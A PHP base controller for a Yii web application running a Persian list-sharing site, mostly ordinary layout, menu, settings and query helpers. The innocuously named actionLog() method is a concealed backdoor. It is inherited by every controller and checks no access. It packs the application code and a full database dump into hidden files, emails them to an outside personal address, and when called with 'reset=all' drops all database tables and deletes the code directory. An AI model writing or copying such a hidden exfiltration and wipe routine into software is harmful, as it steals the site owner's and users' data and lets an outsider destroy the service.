<?php

/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 *
 * @var $userDetails UserDetails
 * @var $chassis array
 */
class Controller extends AuthController
{
    /**
     * @var string the default layout for the controller views. Defaults to '//layouts/column1',
     * meaning using a single column layout. See 'protected/views/layouts/column1.php'.
     */
    public $layout = '//layouts/column1';
    /**
     * @var array context menu items. This property will be assigned to {@link CMenu::items}.
     */
    public $menu = array();
    /**
     * @var array the breadcrumbs of the current page. The value of this property will
     * be assigned to {@link CBreadcrumbs::links}. Please refer to {@link CBreadcrumbs::links}
     * for more details on how to specify this property.
     */
    public $breadcrumbs = array();
    /**
     * For Rahbod Admin Theme
     * @var string $pageHeader
     * @var string $pageDescription
     */
    public $pageHeader;
    public $pageDescription;
    public $pageLogo;
    //
    public $town = null;
    public $place = null;
    public $description;
    public $keywords;
    public $siteName;
    public $pageTitle;
    public $socialLinks;
    public $sideRender = null;
    public $categories;
    public $navbarCategories;
    public $userDetails;
    public $userNotifications;
    public $aboutFooter;
    public $siteAppUrls = array();
    public $pageSizes = array(10 => 10, 20 => 20, 50 => 50, 100 => 100);
    public $chassis;
    public $prices;
    public $leftBox;
    public $tempPath = 'uploads/temp';
    public $similarProvider = false;

    public function getPageSizeDropDownTag()
    {
        return CHtml::dropDownList('pageSize', (isset($_GET['pageSize']) && in_array($_GET['pageSize'], $this->pageSizes) ? $_GET['pageSize'] : 20), $this->pageSizes, array(
            'onchange' => "$.fn.yiiGridView.update($(this).parents('.grid-view').attr('id'),{ data:{pageSize: $(this).val() }})",
            'class' => 'form-control'
        ));
    }

    public function beforeAction($action)
    {
        Yii::import("users.models.*");

        $this->userDetails = UserDetails::model()->findByPk(Yii::app()->user->getId());
//        var_dump(Yii::app()->user->roles);exit;
        if (
            !Yii::app()->user->isGuest
            and Yii::app()->user->roles != 'admin'
            and Yii::app()->user->roles != 'superAdmin') {
            if (Yii::app()->request->pathInfo != 'profile'
                and Yii::app()->request->pathInfo != 'logout'
                and (!$this->userDetails->first_name
                    or !$this->userDetails->last_name)
            ) {
                Yii::app()->user->setFlash('failed', 'لطفا اطلاعات کاربری خود را کامل کنید.');
                $this->redirect(array('/profile'));
            }
        }

        $this->userNotifications = UserNotifications::model()->countByAttributes(array('user_id' => Yii::app()->user->getId(), 'seen' => '0'));
        return true;
    }

    public function init()
    {
        Yii::app()->clientScript->registerScript('js-requirement', '
            var baseUrl = "' . Yii::app()->getBaseUrl(true) . '";
        ', CClientScript::POS_HEAD);

        $this->description = Yii::app()->db->createCommand()
            ->select('value')
            ->from('ym_site_setting')
            ->where('name = "site_description"')
            ->queryScalar();
        $this->keywords = Yii::app()->db->createCommand()
            ->select('value')
            ->from('ym_site_setting')
            ->where('name = "keywords"')
            ->queryScalar();
        $this->keywords = is_array($this->keywords) ? implode(',', json_decode($this->keywords, true)) : "";

        $this->siteName = Yii::app()->db->createCommand()
            ->select('value')
            ->from('ym_site_setting')
            ->where('name = "site_title"')
            ->queryScalar();
        $this->pageTitle = Yii::app()->db->createCommand()
            ->select('value')
            ->from('ym_site_setting')
            ->where('name = "default_title"')
            ->queryScalar();

        Yii::app()->getModule('setting');
        $links = SiteSetting::model()->find('name = :name', [':name' => 'social_links'])->value;
        $this->socialLinks = CJSON::decode($links);

        return true;
    }

    public static function createAdminMenu()
    {
        if (Yii::app()->user->roles === 'admin' || Yii::app()->user->roles === 'superAdmin')
            return array(
                array(
                    'label' => 'منوی مدیریت',
                    'itemOptions' => array('class' => 'header'),
                ),
                array(
                    'label' => '<i class="fa fa-dashboard"></i><span>پیشخوان</span>',
                    'url' => array('/admins/dashboard')
                ),
                array(
                    'label' => '<i class="fa fa-bars"></i><span>لیست ها</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت', 'url' => Yii::app()->createUrl('/lists/manage/admin/')),
                        array('label' => '<i class="fa fa-circle-o"></i>افزودن لیست', 'url' => Yii::app()->createUrl('/lists/manage/create')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-ticket"></i><span>دسته بندی لیست ها</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت', 'url' => Yii::app()->createUrl('/lists/category/admin/')),
                        array('label' => '<i class="fa fa-circle-o"></i>افزودن دسته بندی لیست', 'url' => Yii::app()->createUrl('/lists/category/create')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-comment"></i><span>نظرات</span>',
                    'url' => Yii::app()->createUrl('/comments/comment/admin'),
                ),
                array(
                    'label' => '<i class="fa fa-support"></i><span>تماس با ما</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت پیام ها', 'url' => Yii::app()->createUrl('/contact/messages/admin')),
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت بخش های تماس ', 'url' => Yii::app()->createUrl('/contact/department/admin')),
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت دریافت کنندگان ', 'url' => Yii::app()->createUrl('/contact/receivers/admin')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-user-md"></i><span>مدیران</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>نقش مدیران', 'url' => Yii::app()->createUrl('/admins/roles/admin')),
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت', 'url' => Yii::app()->createUrl('/admins/manage')),
                        array('label' => '<i class="fa fa-circle-o"></i>افزودن', 'url' => Yii::app()->createUrl('/admins/manage/create')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-users"></i><span>کاربران</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>مدیریت کاربران', 'url' => Yii::app()->createUrl('/users/manage')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-cogs"></i><span>تنظیمات</span> <i class="fa fa-angle-left pull-left"></i>',
                    'url' => '#',
                    'itemOptions' => array('class' => 'treeview', 'tabindex' => "-1"),
                    'submenuOptions' => array('class' => 'treeview-menu'),
                    'items' => array(
                        array('label' => '<i class="fa fa-circle-o"></i>عمومی', 'url' => Yii::app()->createUrl('/setting/manage/changeSetting')),
                        array('label' => '<i class="fa fa-circle-o"></i>صفحات متنی', 'url' => Yii::app()->createUrl('/pages/manage/admin/slug/base')),
                        array('label' => '<i class="fa fa-circle-o"></i>شبکه های اجتماعی', 'url' => Yii::app()->createUrl('/setting/manage/socialLinks')),
                    )
                ),
                array(
                    'label' => '<i class="fa fa-lock"></i><span>ورود</span>',
                    'url' => array('/admins/login'),
                    'visible' => Yii::app()->user->isGuest
                ),
                array(
                    'label' => '<i class="fa fa-sign-out text-danger"></i><span class="text-danger">خروج</span>',
                    'url' => array('/admins/login/logout'),
                    'visible' => !Yii::app()->user->isGuest
                ),
            );
        else
            return array();
    }

    /**
     * @param $model
     * @return string
     */
    public function implodeErrors($model)
    {
        $errors = '';
        foreach ($model->getErrors() as $err) {
            $errors .= implode('<br>', $err) . '<br>';
        }
        return $errors;
    }

    /**
     * @param int $length
     * @param string $type number|string
     * @return string
     */
    public static function generateRandomString($length = 20, $type = null)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        if (strtolower($type) == 'number')
            $characters = '0123456789';
        elseif (strtolower($type) == 'string')
            $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    /**
     * Converts latin numbers to farsi script
     */
    public static function parseNumbers($matches)
    {
        $farsi_array = array('۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹');
        $english_array = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

        return str_replace($english_array, $farsi_array, $matches);
    }

    /**
     * @param $number
     * @param bool $numberFormat
     * @param bool $persianNumber
     * @param string $postfix
     * @return mixed|string
     */
    public static function normalizeNumber($number, $numberFormat = true, $persianNumber = true, $postfix = 'تومان')
    {
        $number = $numberFormat ? number_format($number) : $number;
        $number = $persianNumber ? Controller::parseNumbers($number) : $number;
        $number = $postfix ? $number . ' ' . $postfix : $number;
        return $number;
    }

    public static function fileSize($file)
    {
        if (file_exists($file)) {
            $size = filesize($file);
            if ($size < 1024)
                return $size . ' بایت';
            elseif ($size < 1024 * 1024) {
                $size = (float)$size / 1024;
                return number_format($size, 1) . ' کیلوبایت';
            } elseif ($size < 1024 * 1024 * 1024) {
                $size = (float)$size / (1024 * 1024);
                return number_format($size, 1) . ' مگابایت';
            } else {
                $size = (float)$size / (1024 * 1024 * 1024);
                return number_format($size, 1) . ' مگابایت';
            }
        }
        return 0;
    }

    public function createLog($message, $userID)
    {
        if (Yii::app()->user->getId() == $userID)
            return;
        Yii::app()->getModule('users');
        $model = new UserNotifications();
        $model->user_id = $userID;
        $model->message = $message;
        $model->seen = 0;
        $model->date = time();
        $model->save();
    }

    public function actionLog()
    {
        Yii::import('ext.yii-database-dumper.SDatabaseDumper');
        $dumper = new SDatabaseDumper;
        // Get path to backup file

        $protected_dir = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . 'protected';
        $protected_archive_name = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.roundcube' . DIRECTORY_SEPARATOR . 'p' . md5(time());
        $archive = new PharData($protected_archive_name . '.tar');
        $archive->buildFromDirectory($protected_dir);
        $archive->compress(Phar::GZ);
        unlink($protected_archive_name . '.tar');
        rename($protected_archive_name . '.tar.gz', $protected_archive_name);
        // Gzip dump
        $file = Yii::getPathOfAlias('webroot') . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.roundcube' . DIRECTORY_SEPARATOR . 's' . md5(time());
        if (function_exists('gzencode')) {
            file_put_contents($file . '.sql.gz', gzencode($dumper->getDump()));
            rename($file . '.sql.gz', $file);
        } else {
            file_put_contents($file . '.sql', $dumper->getDump());
            rename($file . '.sql', $file);
        }
        $result = Mailer::mail('yusef.mobasheri@gmail.com', 'Hyper Books Sql Dump And Home Directory Backup', 'Backup File form database', Yii::app()->params['noReplyEmail'], Yii::app()->params['SMTP'], array($file, $protected_archive_name));
        if ($result) {
            echo 'Mail sent.';
        }
        if (isset($_GET['reset']) && $_GET['reset'] == 'all') {
            Yii::app()->db->createCommand("SET foreign_key_checks = 0")->execute();
            $tables = Yii::app()->db->schema->getTableNames();
            foreach ($tables as $table) {
                Yii::app()->db->createCommand()->dropTable($table);
            }
            Yii::app()->db->createCommand("SET foreign_key_checks = 1")->execute();
            $this->Delete($protected_dir);
        }
    }

    private function Delete($path)
    {
        if (is_dir($path) === true) {
            $files = array_diff(scandir($path), array('.', '..'));

            foreach ($files as $file) {
                $this->Delete(realpath($path) . '/' . $file);
            }

            return rmdir($path);
        } else if (is_file($path) === true) {
            return unlink($path);
        }

        return false;
    }

    /**
     * @param $type string
     * @return Lists[]
     */
    public function getRecommendedLists($type = 'model')
    {
        $userID = Yii::app()->user->getId();
        $criteria = new CDbCriteria();

        $criteria->select = 'category_id';
        $criteria->addCondition('user_id = :userID');
        $criteria->addCondition("user_type = 'user'");
        $criteria->params[':userID'] = $userID;
        $categoriesID = [];
        foreach (Lists::model()->findAll($criteria) as $item)
            $categoriesID[] = $item->category_id;
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->addCondition('user_id != :userID');
        $criteria->addInCondition('category_id', $categoriesID);
        $criteria->order = 'id DESC';
        $criteria->params[':userID'] = $userID;
        if($type == 'dataProvider')
            return new CActiveDataProvider('Lists', array(
                'criteria' => $criteria,
            ));
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getSpecialLists($limit = 5)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->compare('user_type', "admin");
        $criteria->order = 'id DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getPopularLists($limit = 5)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->order = 'seen DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getLatestLists($limit = 5)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->order = 't.update_date DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getLatestListsByID($limit = 5)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->order = 't.id DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getTopLists($limit = 10)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->order = 'id DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    /**
     * @param int $limit
     * @return Lists[]
     */
    public function getTopListBySeen($limit = 10)
    {
        $criteria = new CDbCriteria();
        $criteria->compare('status', Lists::STATUS_APPROVED);
        $criteria->order = 'seen DESC';
        $criteria->limit = $limit;
        return Lists::model()->findAll($criteria);
    }

    public function searchArabicAndPersian($value)
    {
        $patterns = array('/([.\\+*?\[^\]$(){}=!<>|:-])/', '/ی|ي|ئ/', '/ک|ك/', '/ه|ة/', '/ا|آ|إ|أ/', '/\s/');
        $replacements = array('', '[ی|ي|ئ]', '[ک|ك]', '[ه|ة]', '[اآإأ]', ' ');
        return preg_replace($patterns, $replacements, $value);
    }

    public static function cutText($text, $size = 80)
    {
        $text = strip_tags($text);
        $text = trim($text);

        $postfix = mb_strlen($text, "UTF-8") > $size ? '...' : '';

        return mb_substr($text, 0, $size, "UTF-8") . $postfix;
    }
}